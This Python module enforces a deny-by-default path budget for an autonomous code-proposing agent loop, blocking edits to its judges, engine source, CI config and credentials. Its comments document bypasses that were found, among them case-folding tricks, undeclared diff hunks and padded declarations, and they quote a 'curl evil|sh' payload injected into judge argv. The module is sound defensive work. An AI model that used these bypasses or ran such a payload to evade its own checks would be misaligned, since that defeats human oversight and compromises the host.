"""Agentic-loop path budget — §5, computed from the gate set.

Contract: docs/idea/11-agentic-loop-contract.md §5 (DECISION 5, 5a). Build-order
item 4. This module answers exactly one question, as data:

    given a gate set, which paths may a proposal touch?

and the answer is **deny-by-default**: a path that is not positively classified
as allowed is refused, in the same posture as
`traefik_auth_modes.get(s.id, 'proxy')`.

WHY THE BUDGET IS COMPUTED FROM THE SET AND NOT WRITTEN DOWN AS A LIST
----------------------------------------------------------------------
Constraint C: *a gate you can satisfy by editing the gate is not one.* The
whole point of §5.1 is that the forbidden set is a FUNCTION of the judges that
will grade the proposal. Each judge declares `oracle_paths` in
`state/judge-sets.yml`; `budget_for("repo")` unions the oracles of the judges in
`repo`. Consequences that a constant list could not deliver:

  * `fast` does not run pytest-anatomy, so `tests/anatomy/**` is not claimed by
    a judge there — it is still refused, but as an unclassified path, and the
    409 says so. The refusal reason is honest about WHY.
  * adding a sixth judge to a set automatically closes its source to the loop,
    with no edit here. Forgetting to declare its oracle is a ConfigError at load
    time (`judges.load_registry`), not a silent hole.

WHAT THIS MODULE DOES NOT DO
----------------------------
It does not decide whether a diff is any good, it does not run anything, and it
does not know what a verdict is. It is the pre-flight refusal that stops an
unattended loop from spending 190 s of pytest on a patch whose only effect
would be to make pytest agree with it.

Enforcement site: `ledger.ProposerLedger.check()` calls `check_paths()` before a
proposal row can exist, so the budget is not advisory and not "instructions to
the model" — a proposal that violates it has no uuid, and §3 gives a judge run
nothing to attach to. `loop.py` (routes) surfaces the same refusal as 409.

CI-safe: pure path arithmetic over a YAML registry. No host, no network, no db.
"""

from __future__ import annotations

import posixpath
import re
from dataclasses import dataclass
from fnmatch import fnmatch
from typing import Any, Iterable, Sequence

import judges  # the registry is the judges' own, not a second declaration

__all__ = [
    "Budget",
    "Rule",
    "Violation",
    "budget_for",
    "check_paths",
    "diff_added_paths",
    "diff_paths",
    "ALLOWED_ROOTS",
    "ALWAYS_FORBIDDEN",
    "MAX_FILES",
    "MAX_DIFF_LINES",
    "GATE_ADD_INTENTS",
]

# ── §5.4 size caps ────────────────────────────────────────────────────────
# Guesses, and §9.3 says so out loud: both are to be re-set from the first
# fifty cycles. They are here rather than in a role default because a role
# default is not "defined before core-up" (constraint G).
MAX_FILES = 5
MAX_DIFF_LINES = 200

# ── §5.3 allowed roots ────────────────────────────────────────────────────
# Positive classification. Everything outside this is denied whether or not any
# rule below names it. A trailing "/" means "this directory, recursively";
# an entry without one is an exact file.
ALLOWED_ROOTS: tuple[str, ...] = (
    "roles/",
    "files/anatomy/plugins/",
    "tasks/",
    "apps/",
    "upgrades/",
    "default.config.yml",
)

# ── §5a the carve-out ─────────────────────────────────────────────────────
# `gate-add` is the one intent that may write the oracle's own directory,
# because forbidding it outright would mean the loop can never add a gate —
# and adding gates is among the most valuable things it could do. The
# carve-out is deliberately NARROW:
#   * only `tests/anatomy/**`, never the harness files inside it;
#   * never another judge's oracle (a gate-add may not touch genome-codegen);
#   * only paths the diff CREATES (`diff_added_paths`) — modifying, renaming
#     or deleting an existing gate is refused whatever the intent claims;
#   * and the ledger independently stamps `requires_operator` for this intent,
#     so nothing in this carve-out is auto-acceptable. The coupling is pinned
#     by the gate: GATE_ADD_INTENTS must be a subset of the ledger's
#     OPERATOR_REQUIRED_INTENTS, or the carve-out becomes an open door.
GATE_ADD_INTENTS = frozenset({"gate-add"})
_GATE_ADD_ROOT = "tests/anatomy/"
#: Inside the carve-out root, these are still refused: they configure which
#: gates run, which is not the same act as adding one.
_GATE_ADD_NEVER_BASENAMES = frozenset({"conftest.py", "__init__.py", "pytest.ini"})


@dataclass(frozen=True)
class Rule:
    """One forbidden pattern, and — this is the load-bearing field — WHO claims
    it. §5 requires the 409 to name the judge, so a proposer learns the shape of
    the refusal rather than guessing."""

    pattern: str
    reason: str          # stable machine code, never free text
    claimed_by: str      # judge name, or "§5.2" for the always-forbidden set

    def to_dict(self) -> dict[str, str]:
        return {"pattern": self.pattern, "reason": self.reason,
                "claimed_by": self.claimed_by}


# ── §5.2 always forbidden, every set ──────────────────────────────────────
# Each entry carries the sentence that justifies it, because a deny list whose
# entries nobody can explain is a deny list that gets "cleaned up".
ALWAYS_FORBIDDEN: tuple[Rule, ...] = (
    # The engine's own source. A loop that rewrites its own instructions is not
    # improving, it is drifting.
    Rule("files/anatomy/bone/**", "engine-source", "§5.2"),
    Rule("roles/pazny.bone/**", "engine-source", "§5.2"),
    # The registry IS the gate set. Editing it is editing every oracle at once,
    # which is why it is committed to the repo in the first place (§2.1).
    Rule("state/judge-sets.yml", "engine-source", "§5.2"),
    # The loop's own plugin skills and this contract.
    Rule("docs/**", "doctrine", "§5.2"),
    Rule(".claude/**", "agent-config", "§5.2"),
    Rule(".github/workflows/**", "ci-config", "§5.2"),
    # Constraint E, REM-144: a `domain_var` + `port_var` added here
    # auto-derives a Traefik router. The loop may not create edge surface.
    Rule("state/manifest.yml", "edge-surface", "§5.2"),
    Rule("roles/pazny.traefik/vars/main.yml", "edge-surface", "§5.2"),
    # Constraint D. Not "secrets are sensitive" — a proposal that edits a
    # credential template changes what every service authenticates with, and no
    # judge in any set would notice.
    Rule("default.credentials.yml", "secrets", "§5.2"),
    Rule("credentials.yml", "secrets", "§5.2"),
    Rule("templates/secrets.yml.j2", "secrets", "§5.2"),
)


@dataclass(frozen=True)
class Violation:
    """A refusal, in the shape §5 requires: the offending path, and the judge
    that claims it."""

    path: str
    reason: str
    claimed_by: str
    detail: str = ""

    def __str__(self) -> str:  # what the 409 body and the CLI print
        who = f" (claimed by {self.claimed_by})" if self.claimed_by else ""
        return f"{self.path}: {self.reason}{who}{(' — ' + self.detail) if self.detail else ''}"

    def to_dict(self) -> dict[str, str]:
        return {"path": self.path, "reason": self.reason,
                "claimed_by": self.claimed_by, "detail": self.detail}


@dataclass(frozen=True)
class Budget:
    """The answer to `GET /api/v1/loop/budget?gate_set=` — data, not prose."""

    gate_set: str
    judges: tuple[str, ...]
    allowed_roots: tuple[str, ...]
    forbidden: tuple[Rule, ...]
    max_files: int = MAX_FILES
    max_diff_lines: int = MAX_DIFF_LINES

    def oracle_rules(self) -> tuple[Rule, ...]:
        """Only the rules contributed BY the judges of this set (§5.1)."""
        return tuple(r for r in self.forbidden if r.reason == "oracle")

    def to_dict(self) -> dict[str, Any]:
        import ledger  # local: ledger imports THIS module, so not at top level

        return {
            "gate_set": self.gate_set,
            # THE CLOSED intent_class ENUM, because the proposer skill sends the
            # proposer HERE for it ("the response is the authority ... this
            # document lists none of them, deliberately") and until 2026-08-27
            # the response did not carry it — the only enum present was the
            # gate-add carve-out's two. A MiniMax-served proposer tried nine
            # plausible words for REM-229, was refused nine times with a detail
            # that echoed its own guess, and gave up correctly. Every proposal
            # authored before this was a lucky guess or an operator typing.
            "intent_classes": sorted(ledger.INTENT_CLASSES),
            "judges": list(self.judges),
            "allowed_roots": list(self.allowed_roots),
            "forbidden": [r.to_dict() for r in self.forbidden],
            "max_files": self.max_files,
            "max_diff_lines": self.max_diff_lines,
            "gate_add_carve_out": {
                "intents": sorted(GATE_ADD_INTENTS),
                "root": _GATE_ADD_ROOT,
                "never": sorted(_GATE_ADD_NEVER_BASENAMES),
                "requires_operator": True,
                # §5a means ADD: only paths the diff structurally creates
                # (old side /dev/null) receive the exemption.
                "adds_only": True,
            },
        }


# ── construction ──────────────────────────────────────────────────────────

def budget_for(gate_set: str, *, registry: "judges.Registry | None" = None,
               repo_root: str | None = None) -> Budget:
    """§5.1 — the budget IS a function of the gate set.

    Raises `judges.ConfigError` for an unknown gate set: a typo must not
    silently produce an empty forbidden list, which is the M2/M3 shape (absence
    reading as permission) inside the budget itself.
    """
    reg = registry if registry is not None else judges.load_registry(repo_root)
    spec = reg.gate_set(gate_set)

    rules: list[Rule] = list(ALWAYS_FORBIDDEN)
    for judge_name in spec.judges:
        judge = reg.judges[judge_name]
        for pattern in judge.oracle_paths:
            rules.append(Rule(pattern, "oracle", judge_name))

    return Budget(
        gate_set=spec.name,
        judges=tuple(spec.judges),
        allowed_roots=ALLOWED_ROOTS,
        forbidden=tuple(rules),
    )


# ── matching ──────────────────────────────────────────────────────────────

def _normalize(path: str) -> str:
    # normpath already collapses a leading "./"; do NOT lstrip("./") after it —
    # lstrip is character-wise, so it eats the leading dot of `.ansible-lint`
    # and `.github/workflows/`, i.e. of exactly the dotfile oracles this budget
    # exists to protect. (Caught by this module's own gate on its first run.)
    return posixpath.normpath(str(path).strip().replace("\\", "/"))


def _fold(path: str) -> str:
    """The spelling this budget COMPARES, as opposed to the one it PRINTS.

    MEASURED on this host (APFS, `core.ignorecase=true`): `roles/pazny.Bone/
    tasks/main.yml` opens the real `roles/pazny.bone/tasks/main.yml`, byte for
    byte. Every comparison below was case-sensitive — `startswith`, `==`, and
    fnmatch, which inherits the platform's `posixpath.normcase` (a no-op even on
    macOS). So a one-character capitalisation walked straight through the §5.2
    rules that forbid the engine's own Ansible role and the Traefik vars file
    that decides which routers get `authentik@file`, and through the §5a
    never-list that keeps `conftest.py` out of the gate-add carve-out — while
    resolving to the protected file on disk. Deny-by-default saved every path
    OUTSIDE an allowed root; the hole was exactly the intersection of a broad
    allowed root (`roles/`) with a case-sensitive deny rule.

    Fold both sides, always. `Violation.path` keeps the original spelling, so
    the 409 still shows the proposer what it actually asked for.
    """
    return _normalize(path).casefold()


def _escapes_repo(raw: str) -> bool:
    p = str(raw).strip()
    if not p or p.startswith("/") or p.startswith("~"):
        return True
    return posixpath.normpath(p.replace("\\", "/")).startswith("..")


def matches(path: str, pattern: str) -> bool:
    """`dir/**` is a recursive prefix; anything else is an fnmatch/exact match.

    Kept small and explicit rather than reaching for pathlib's glob semantics,
    which differ between "match" and "full_match" across Python versions — a
    budget whose meaning depends on the interpreter is not a budget. Both sides
    are case-folded for the same reason: a budget whose meaning depends on the
    filesystem's case sensitivity is not a budget either (see `_fold`).
    """
    path = _fold(path)
    pattern = _fold(pattern) if not pattern.endswith("/**") else pattern.casefold()
    if pattern.endswith("/**"):
        root = pattern[:-3]
        return path == root or path.startswith(root + "/")
    return path == pattern or fnmatch(path, pattern)


def _in_allowed_root(path: str) -> bool:
    path = _fold(path)
    for root in ALLOWED_ROOTS:
        if root.endswith("/"):
            if path.startswith(root.casefold()):
                return True
        elif path == _fold(root):
            return True
    return False


def _gate_add_exempt(path: str, intent_class: str) -> bool:
    """§5a — the DECLARATION half of the carve-out: right intent, right root,
    not a harness basename. The ARTIFACT half — the path must be a pure
    addition in the diff — is applied at the one place the diff exists,
    inside `check_paths`. See GATE_ADD_INTENTS."""
    if intent_class not in GATE_ADD_INTENTS:
        return False
    folded = _fold(path)
    if not folded.startswith(_GATE_ADD_ROOT.casefold()):
        return False
    never = {b.casefold() for b in _GATE_ADD_NEVER_BASENAMES}
    return posixpath.basename(folded) not in never


def diff_line_count(diff_text: str) -> int:
    """Changed lines only — `+++`/`---` headers are not edits."""
    n = 0
    for line in diff_text.splitlines():
        if line.startswith(("+++", "---")):
            continue
        if line.startswith(("+", "-")):
            n += 1
    return n


_DIFF_GIT_RE = re.compile(r'^diff --git ("?[ab]/.+?"?) ("?[ab]/.+"?)$')
_DIFF_FILE_RE = re.compile(r'^(?:\+\+\+|---) (.+)$')


def _strip_ab(token: str) -> str | None:
    """`b/roles/x.yml` → `roles/x.yml`; `/dev/null` and junk → None."""
    tok = token.strip()
    if tok.endswith("\t"):
        tok = tok.rstrip()
    tok = tok.split("\t")[0].strip()
    if tok.startswith('"') and tok.endswith('"') and len(tok) > 1:
        tok = tok[1:-1]
    if not tok or tok == "/dev/null":
        return None
    if tok[:2] in ("a/", "b/"):
        tok = tok[2:]
    return tok or None


def diff_paths(diff_text: str) -> list[str]:
    """Every path the PATCH touches, read out of the patch itself.

    §5 refused a proposer's *declaration*. It never looked at the artifact, so a
    proposal declaring `roles/pazny.n8n/tasks/main.yml` while carrying a hunk
    that rewrites `state/judge-sets.yml` — the file whose §5.2 rule is justified
    as "editing it is editing every oracle at once", and whose `argv` entries
    `judges.real_spawn` executes verbatim — was ALLOWED. Both spellings are
    read (`diff --git` and the `---`/`+++` headers) because a rename or a
    delete carries the old path only in one of them.
    """
    out: list[str] = []
    for raw in (diff_text or "").replace("\r\n", "\n").split("\n"):
        line = raw.rstrip("\n")
        m = _DIFF_GIT_RE.match(line)
        if m:
            for token in m.groups():
                p = _strip_ab(token)
                if p:
                    out.append(p)
            continue
        m = _DIFF_FILE_RE.match(line)
        if m:
            p = _strip_ab(m.group(1))
            if p:
                out.append(p)
    seen: set[str] = set()
    ordered: list[str] = []
    for p in out:
        key = _fold(p)
        if key not in seen:
            seen.add(key)
            ordered.append(p)
    return ordered


def _is_dev_null(token: str) -> bool:
    tok = token.strip().split("\t")[0].strip()
    if tok.startswith('"') and tok.endswith('"') and len(tok) > 1:
        tok = tok[1:-1]
    return tok == "/dev/null"


def _diff_blocks(diff_text: str) -> list[dict[str, Any]]:
    """The diff as per-file STRUCTURE: one dict per file block, carrying the
    old/new header tokens, the `diff --git` pair, and the mode/rename markers.

    This is the §5a discriminator's input, and it is deliberately structural:
    a gate that greps a diff for the string `/dev/null` would be satisfied by
    a diff whose added CONTENT mentions /dev/null — the artifact would grade
    itself with its own prose, constraint C one level down."""
    blocks: list[dict[str, Any]] = []
    cur: dict[str, Any] | None = None
    for raw in (diff_text or "").replace("\r\n", "\n").split("\n"):
        line = raw.rstrip("\n")
        m = _DIFF_GIT_RE.match(line)
        if m:
            cur = {"git": m.groups()}
            blocks.append(cur)
            continue
        if line.startswith("--- "):
            if cur is None or "old" in cur:
                # a bare unified diff (no `diff --git`), or a stray header-shaped
                # line inside a hunk: open a fresh block. The stray case can only
                # DEMOTE a path from "added" to "touched" — fail-closed.
                cur = {}
                blocks.append(cur)
            cur["old"] = line[4:]
            continue
        if cur is None:
            continue
        if line.startswith("+++ "):
            cur["new"] = line[4:]
        elif line.startswith("new file mode "):
            cur["new_file"] = True
        elif line.startswith(("rename from ", "rename to ",
                              "copy from ", "copy to ")):
            cur["moved"] = True
    return blocks


def diff_added_paths(diff_text: str) -> set[str]:
    """Case-folded keys of paths the patch CREATES — and creates only.

    A block is an addition iff its old side is /dev/null or it carries
    `new file mode`, and it is not a rename/copy (moved content is existing
    content wearing a new path). A path named by any non-addition block is
    excluded even if another block adds it: one diff must not launder a rewrite
    of an existing file behind a genuinely new sibling.
    """
    added: set[str] = set()
    touched: set[str] = set()
    for block in _diff_blocks(diff_text):
        names: set[str] = set()
        for token in (block.get("old"), block.get("new"), *block.get("git", ())):
            if token is None:
                continue
            p = _strip_ab(token)
            if p:
                names.add(_fold(p))
        old = block.get("old")
        is_add = (bool(block.get("new_file"))
                  or (old is not None and _is_dev_null(old)))
        if is_add and not block.get("moved"):
            added |= names
        else:
            touched |= names
    return added - touched


# ── the check ─────────────────────────────────────────────────────────────

def check_paths(paths: Iterable[str], *, intent_class: str, gate_set: str,
                registry: "judges.Registry | None" = None,
                repo_root: str | None = None,
                budget: Budget | None = None,
                diff_text: str | None = None) -> list[Violation]:
    """Every violation, not just the first — a proposer that has to rediscover
    the budget one 409 at a time will burn attempts against the deduplicator.

    Order of judgement, deny beats allow:
      1. a path the DIFF touches but the proposal did not declare → `undeclared-path`
      2. a path the proposal declares but the diff never edits → `declared-path-untouched`
      3. outside the repo root at all              → `outside-repo`
      4. claimed by a rule (oracle or §5.2)        → that rule's reason
      5. not under an allowed root                 → `not-in-allowed-roots`
      6. size caps                                 → `too-many-files` / `diff-too-large`

    THE DIFF IS CHECKED, NOT ONLY THE DECLARATION. Every rule below used to be
    applied to `paths` alone — a list the proposer writes — while `diff_text`
    was consulted for its line count and nothing else. MEASURED: a patch
    rewriting `state/judge-sets.yml`'s `argv` to `["sh","-c","curl evil|sh"]`
    was ALLOWED when declared as `roles/pazny.n8n/tasks/main.yml`. §5 was a
    check on a claim; a claim is not the artifact. Diff-derived paths are folded
    into the same rule loop, and any of them the proposal failed to declare is
    itself a refusal — so the declaration stays meaningful rather than becoming
    decorative.
    """
    bud = budget if budget is not None else budget_for(
        gate_set, registry=registry, repo_root=repo_root)

    declared: list[str] = [str(p) for p in paths]
    out: list[Violation] = []

    from_diff = diff_paths(diff_text) if diff_text else []
    declared_keys = {_fold(p) for p in declared if not _escapes_repo(p)}
    undeclared = [p for p in from_diff if _fold(p) not in declared_keys]
    for path in undeclared:
        out.append(Violation(
            path, "undeclared-path", "§5",
            "the diff edits a path target_paths does not declare; §5 judges the "
            "artifact, not the claim"))

    # THE DECLARATION MUST MATCH THE ARTIFACT IN BOTH DIRECTIONS. The check
    # above catches a diff that touches more than it declared; this one catches
    # a declaration that claims more than the diff touches. That direction
    # looked harmless — an over-broad claim edits nothing — until the §4
    # fingerprint is read next to it: `target_paths` is one of the four hash
    # inputs, so PADDING the declaration with any allowed path mints a brand-new
    # fingerprint (and with it a fresh attempt ceiling) for a byte-identical
    # patch. Refusing the pad makes target_paths derived data: the only
    # declaration that survives is the one equal to what the diff itself says.
    if diff_text:
        diff_keys = {_fold(p) for p in from_diff}
        for raw in declared:
            if not _escapes_repo(raw) and _fold(raw) not in diff_keys:
                out.append(Violation(
                    str(raw), "declared-path-untouched", "§5",
                    "target_paths declares a path the diff never edits; §4 "
                    "hashes the declaration, so a padded path is a freshly "
                    "minted attempt ceiling for an unchanged patch"))

    # The union is what gets rule-checked and size-capped: a file the diff
    # touches is a file the proposal edits, whoever wrote it down.
    raw_paths: Sequence[str] = declared + undeclared

    # §5a MEANS ADD. The carve-out's grant is read off the ARTIFACT: only a
    # path the diff structurally CREATES (old side /dev/null, no rename) keeps
    # the exemption. `_gate_add_exempt` used to look at the path alone, so a
    # gate-add could MODIFY any existing file under tests/anatomy/ except three
    # basenames — including this loop's own gates — and under gate set `fast`
    # no judge in the set would ever execute the file it changed. With no diff
    # there is no proof of addition, so nothing is added and nothing is exempt.
    gate_add_added: set[str] = set()
    gate_add_diff_keys: set[str] = set()
    if intent_class in GATE_ADD_INTENTS and diff_text:
        gate_add_added = diff_added_paths(diff_text)
        gate_add_diff_keys = {_fold(p) for p in from_diff}

    for raw in raw_paths:
        if _escapes_repo(raw):
            out.append(Violation(str(raw), "outside-repo", "§5.2",
                                 "absolute, home-relative or parent-escaping"))
            continue

        path = _normalize(raw)
        exempt = _gate_add_exempt(path, intent_class)
        if exempt and _fold(path) not in gate_add_added:
            exempt = False
            if _fold(path) in gate_add_diff_keys:
                # The diff DOES touch it — as a modify, rename or delete of an
                # existing gate. Name the refusal so the 409 is actionable
                # rather than a misleading `oracle`/`not-in-allowed-roots`.
                out.append(Violation(
                    path, "gate-add-rewrites-gate", "§5a",
                    "gate-add may only CREATE files under tests/anatomy/ "
                    "(old side /dev/null in the diff); rewriting or removing "
                    "an existing gate is not the addition of one"))
                continue

        hit = None
        for rule in bud.forbidden:
            if not matches(path, rule.pattern):
                continue
            # §5a: the carve-out re-opens `tests/anatomy/**` for gate-add, and
            # only that pattern. Any other rule matching the same path still
            # refuses it.
            if exempt and rule.pattern == _GATE_ADD_ROOT + "**":
                continue
            hit = rule
            break

        if hit is not None:
            detail = (f"the {hit.claimed_by} judge grades this proposal"
                      if hit.reason == "oracle" else "")
            out.append(Violation(path, hit.reason, hit.claimed_by, detail))
            continue

        if not (_in_allowed_root(path) or exempt):
            out.append(Violation(path, "not-in-allowed-roots", "§5",
                                 "deny beats allow; an unclassified path is denied"))

    if len(raw_paths) > bud.max_files:
        out.append(Violation(f"<{len(raw_paths)} files>", "too-many-files", "§5.4",
                             f"max_files={bud.max_files}"))

    if diff_text is not None:
        lines = diff_line_count(diff_text)
        if lines > bud.max_diff_lines:
            out.append(Violation(f"<{lines} changed lines>", "diff-too-large", "§5.4",
                                 f"max_diff_lines={bud.max_diff_lines}"))

    return out
